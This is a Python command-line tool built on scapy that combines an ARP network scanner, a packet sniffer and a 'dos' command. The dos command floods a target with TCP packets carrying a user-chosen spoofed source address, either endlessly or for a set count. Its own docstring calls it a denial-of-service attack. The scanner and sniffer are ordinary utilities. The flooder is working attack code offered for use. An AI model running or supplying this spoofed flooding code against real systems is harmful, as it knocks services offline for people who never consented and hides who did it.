#!/usr/bin/env python3

from scapy.all import *
from typing import Optional
import typer
import scan

VERSION="v0.1"
CREDITS = '		   Created by @CyberVarun (https://github.com/CyberVarun) '

app = typer.Typer(add_completion=False)

@app.command()
def nscn(
	net: str = typer.Option(..., '--net', '-n', help="Specify network address."),
	rang: Optional[str] = typer.Option(None, '--range', '-r', help="Specify network range (8/16/24). default is (IP/24)."),
	output: bool = False,
):
	"""
	To scan network using scapy module.
	"""
	LOGO='''
			 _   _      _          _____                 
			| \ | |    | |        / ____|                
			|  \| | ___| |_ _____| (___   ___ __ _ _ __  
			| . ` |/ _ \ __|______\___ \ / __/ _` | '_ \ 
			| |\  |  __/ |_       ____) | (_| (_| | | | |
			|_| \_|\___|\__|     |_____/ \___\__,_|_| |_|'''

	# Specifying the network range IP/rang. Defautl is IP/24 (127.0.0.1/24). 
	if rang is None: 
		network = net + "/24"
	else:
		network = net + "/" + rang

	# Empty list for data output (--output option)
	data_list2 = {}

	# Printing Logo, creadits and version
	typer.secho(LOGO, fg=typer.colors.BRIGHT_CYAN)
	typer.secho(f"{CREDITS}{VERSION}\n", fg=typer.colors.BRIGHT_CYAN)
	
	try:
		# Broadcasting ARP (Address Resolution Protocol) requestest into network.
		addresses = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=network), timeout=1, verbose=False)[0]
		
		for addr in addresses:
			# Grabbing devices IP(.psrc) and MAC(.hwsrc) that replied to the request. 
			typer.secho(f"IP: {addr[1].psrc}		MAC: {addr[1].hwsrc}", fg=typer.colors.BRIGHT_GREEN)
			# Adding data to data_list2 for output.
			data_list2[addr[1].psrc] = "live"
	
	except Exception as error:
		typer.secho(f"{error}", fg=typer.colors.RED)

	except KeyboardInterrupt:
		typer.secho("[!] Keyboard Interrupt", fg=typer.colors.RED)
		exit()

	# Creating output data in .json format if output option is set to true
	scn = 0
	scan.data_output(net, output, data_list2, scn)

@app.command()
def sniffer(
	interface: str = typer.Option(..., '--iface', '-i', help="Specify network interface(wlan0/eth0)."),
	count: Optional[int] = typer.Option(None, '--count', '-c', help="Specify timeout. By default is will do live sniffing."),
	pkt_type: str = typer.Option(..., '--type', '-t', help="Specify packet typer(tcp/ip)."),
):	

	"""
	To sniff network traffic.
	"""
	try:
		if count is None and pkt_type == "all":
			# sniffing all types of packets.
			sniff(iface=interface, prn = lambda x: x.summary())
		
		elif count != None and  pkt_type == "all":
			# sniffing selected but all types of packets.
			s = sniff(iface=interface, count=count)
			s.summary()

		elif count is None:
			# sniffing all but filtered packets.
			sniff(iface=interface, filter=pkt_type, prn = lambda x: x.summary())
		
		else:
			# Sniffing selected and filtered packets. 	
			s = sniff(iface=interface, count=count, filter=pkt_type)
			s.summary()

	except Exception as error:
		typer.secho(f"{error}", fg=typer.colors.RED)

	except KeyboardInterrupt:
		typer.secho("[!] Keyboard Interrupt", fg=typer.colors.RED)
		exit()

@app.command()
def dos(
	target: str = typer.Option(..., '--target', '-t', help="Specify target address (IP)."),
	source: str = typer.Option(..., '--source', '-s', help="Specify source address (IP)."),
	sport: int = typer.Option(..., '--sport', '-sp', help="Specify source port."),
	dport: int = typer.Option(..., '--dport', '-dp', help="Specify destination port."),
	count: Optional[int] = typer.Option(None, '--count', '-c', help="Specify how many packet should be sent. By default it will broadcast."),
):
	"""
	To do DOS(Deniel of service) attack on system.
	"""
	try:
		if count is None:
			# Broadcasting TCP packets
			send(IP(src=source, dst=target)/TCP(sport=sport, dport=dport),loop=1)
		else:
			# Sending selected(count) packets
			send(IP(src=source, dst=target)/TCP(sport=sport, dport=dport),count=count)

	except Exception as error:
		typer.secho(f"{error}", fg=typer.colors.RED)

	except KeyboardInterrupt:
		typer.secho("[!] Keyboard Interrupt", fg=typer.colors.RED)
		exit()